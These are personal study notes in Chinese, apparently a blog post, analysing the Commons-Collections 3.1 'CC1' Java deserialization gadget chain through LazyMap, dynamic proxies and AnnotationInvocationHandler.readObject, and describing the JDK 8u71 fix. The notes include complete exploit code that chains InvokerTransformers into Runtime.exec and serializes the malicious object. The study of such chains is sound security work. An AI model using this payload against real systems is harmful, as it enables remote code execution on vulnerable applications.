---
title: 'CC1链 学习笔记'
date: 2023-07-11 09:29:59
tags: [java,学习笔记,java漏洞,cc1]
published: true
hideInList: false
feature: 
isTop: false
---
# CC1链

## 前言

大佬们文章很细很全, 为了给自己捋思路…….就比如: 把有疑惑的点反复看,然后在不同的文章里(以及google搜索,补充基础知识etc)找到”为什么这里用XXXX”的原因.  

备注: 参考是自己都看过一遍or多遍的文章, 先学的理论, 实践跟着调试相关的打算后续上传github关于漏洞复现环境(TODO)  

### 基础

CC1(commons-collections3.1-3.2.1) 链下有 `Lazymap` 和 `transformedMap` 两条利用链. 这两条都是利用 `Annotationinvocation` 类来触发的.

基本环境:

- apache commons-collections3.1-3.2.1
- jdk1.7.1以下

环境部署maven参考:

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

## 利用链核心

利用链核心一览(概括)

- `Constantransformer` 类
    - 初始化 `this.iConstant`
- `InvokerTransformer` 类
    - 初始化 `this.iMethodName`
- `ChainedTransformer` 类
    - `transform` 方法(public): 反射获取类下方法,并返回invoke(实参)调用结果
    - 当参数是一个数组时, 对每个参数调用 `transform` 方法.

以上的类都是对接口 `Transformer` 接口类的实现,

### `Constantransformer` 类

该类方法下有一个 `transform` 方法, 

```java
	public Object transform(object input) { return iConstant;}
```

无论接受什么对象 都返回 `iConstant` (对该常量的定义在构造函数内)

### `InvokerTransformer` 类

transform方法代码

```java
public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

其中这两行一眼反射

```java
Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
// 常见利用链写法
//Runtime runtime =  Runtime.getRuntime(); 
// Class<? extends Runtime> aClass = runtime.getClass();
// Method exec = aClass.getMethod("exec", String.class);
// exec.invoke(runtime,"calc");
// 所以这里 input为 ( input为Runtime.getRuntime())
```

其中 `iMethodName` 和 `iParamTypes` 都在构造方法中有定义

```java
private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
        this.iArgs = null;
    }
```

所以, payload构造时:

```java
Transformer transformerChain = new ChainedTransformer(new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),
new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})
});
```

利用链入口点: `sun.reflect.annotation.AnnotationInvocationHandler#readObject` 

## 利用链

目前已有的利用链有两条, 

一条是ysoserial用的LazyMap

另一条是TransformedMap

> LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator
> 
> 
> LazyMap 的漏洞触发点和 TransformedMap 唯一的差别是，TransformedMap 是在写入元素的时候执行 transform，而 LazyMap 是在其 get 方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值
> 

## Lazymap利用链分析

根据刚刚利用链核心, 从 `Find Usages` 找到了 `Lazymap` 调用了 `transform` . 然后目标是最后找到 `readObject` 方法.

### 一. **LazyMap**

1. 首先看 `LazyMap` 下的 `get` 方法, 调用了 **transform 方法(即利用链核心下的类方法)**
    
    > get方法同时还要求传入一个Object 参数，get方法内部在调用transform方法之前会先判断一下key，如果当前map中不存在key的话，则通过factory来创建一个value
    > 
    
    ```java
    public Object get(Object key) {
            // create value for key if key is not currently in the map
            if (map.containsKey(key) == false) {
                Object value = factory.transform(key);
                map.put(key, value);
                return value;
            }
            return map.get(key);
        }
    
    // factory 这里是LazyMap类的成员属性, 其他数据类型也是Transformer
    ```
    
    当在get找不到值的时候，它会调用factory.transform方法去获取一个值。
    
    这里 `factory` 找可控的地方, 找到一个public访问权限的 `decorate` 方法
    
    ```java
    public static Map decorate(Map map, Transformer factory) {
            return new LazyMap(map, factory);
     }
    ```
    
    **factory可控**: 反射或者构造方法控制factory. 从而使其调用指定类的transformer方法.
    

### 二.  **`LazyMap` 的get触发点**

查找`AnnotationInvocationHandler` 类 `get` 方法被调用的地方, 最后找到了 `invoke` 方法

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    // Handle Object and Annotation methods
    if (member.equals("equals") && paramTypes.length == 1 &&
        paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    if (paramTypes.length != 0)
        throw new AssertionError("Too many parameters for an annotation method");

    switch(member) {
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
    }

    // Handle annotation member accessors
    Object result = memberValues.get(member);
    // ....
}
```

注意这里 `memberValues` 可控

### 三. ** `invoke` 调用点**

找到能调用( `AnnotationInvocationHandler` 类的 `invoke` 方法)的点. 

因为 `AnnotationInvocationHandler` 类继承了 `InvocationHandler` 类, 这里可以用[动态代理类](https://www.cnblogs.com/wobuchifanqie/p/9991342.html)的方式, 用 `newProxyInstance`  

```java
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h);
// 分别传入:
// 1. Map类加载器
// 2. lazyMap实现的接口 LazyMap.getClass().getInterfaces()
// 3. annotationInvocationHandler对象 (即InvocationHandler) 
```

接下来的目标是  `readObject`中调用任意方法，调用者是`AnnotationInvocationHandler`代理对象

### **四.  利用动态代理**来**构造invoke调用点 (修改 `memberValues` 为指定代理类)**

在 `AnnotationinvocationHandler` 类下, 因为 `this.memberValues` 可控(在实例化时传入), 而且在该类的 `readObject` 函数中, 也调用了`memberValues` . 所以可以利用反射, 将生成的代理类赋值给 `memberValues` 

1.  利用反射 将 `proxyMap` (即LazyMap代理类) 作为参数传入赋值给 `this.memberValues` , 从而调用`invoke` 调用点. 

```java
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```

这里 `memberValues` 对应上面的

### **五.  `readObject` 方法, 利用链反序列化入口点(重要)**

因为入口点在 `sun.reflect.annotation.AnnotationInvocationHandler#readObject`  

该入口点会在反序列化的时候重写 `readObject` 方法

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        Map var3 = var2.memberTypes();
        //获取LazyMap父类的entrySet
        Iterator var4 = this.memberValues.entrySet().iterator(); //遍历key-value
        while(var4.hasNext()) {
            //代理对象调用方法
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
```

这里 `this.memberValues` 的值就是动态代理对象 `proxyMap`  

所以当反序列化执行, 动态代理就会调用代理对象(即: 在 readObject() 方法中,调用了 memberValues 的方法,这个 memberValues 就是动态代理对象. 好像是重复的话 但理解是这样的)

## payload

这个网上都有, 参考其中一个:

```java
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
new InvokerTransformer("exec",new Class[]{String.class},new Object []{"calc"})
};
ChainedTransformer chainedtransformer = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap,chainedtransformer);
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class,outerMap);
Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);
Object o = (Object) constructor.newInstance(Override.class,proxyMap);
serialize(o);
unserialize();
```

## 修复

> `LazyMap`的漏洞触发在get和invoke中 而`TransformedMap`的漏洞触发在setValue中 同样在 **jdk 8u71**之后，由于`AnnotationInvocationHandler`不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，后续对Map的操作都是基于这个新的LinkedHashMap对象。 因此CC1链只局限在**jdk 8u71**之前的版本。
> 

## Reference

- [https://blog.csdn.net/m0_64685672/article/details/122526803?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_64685672/article/details/122526803?spm=1001.2014.3001.5502)
- [https://blog.csdn.net/qq_35733751/article/details/118462281](https://blog.csdn.net/qq_35733751/article/details/118462281)
- [https://blog.csdn.net/weixin_45808483/article/details/122743960](https://blog.csdn.net/weixin_45808483/article/details/122743960)
- [https://blog.csdn.net/u012326462/article/details/81293186](https://blog.csdn.net/u012326462/article/details/81293186) (动态代理类)
- [https://zoceanyq.github.io/2022/11/08/cc1链分析/](https://zoceanyq.github.io/2022/11/08/cc1%E9%93%BE%E5%88%86%E6%9E%90/)
- [https://www.bilibili.com/video/BV1no4y1U7E1/?vd_source=df9a56be52d51a090e98fcf8c8310ec2](https://www.bilibili.com/video/BV1no4y1U7E1/?vd_source=df9a56be52d51a090e98fcf8c8310ec2) (视频先mark在这里, 不过我先看的文章 视频打算最后有不懂的地方过)
- [https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&mid=2247486261&idx=1&sn=5bce20d898eba670b4b129a8a3092449](https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&mid=2247486261&idx=1&sn=5bce20d898eba670b4b129a8a3092449) (不建议作为一个了解cc1的整体文章阅读 但新人一些细节上没看懂的可以看这篇)
- [https://github.com/p4d0rn/Java_Zoo/blob/main/Deserial/CC1_LazyMap.md](https://github.com/p4d0rn/Java_Zoo/blob/main/Deserial/CC1_LazyMap.md)

补充知识学习:

- 动态代理(略)
- entrySet: [https://blog.csdn.net/q5706503/article/details/85122343](https://blog.csdn.net/q5706503/article/details/85122343) (一个键值对就算一个entry )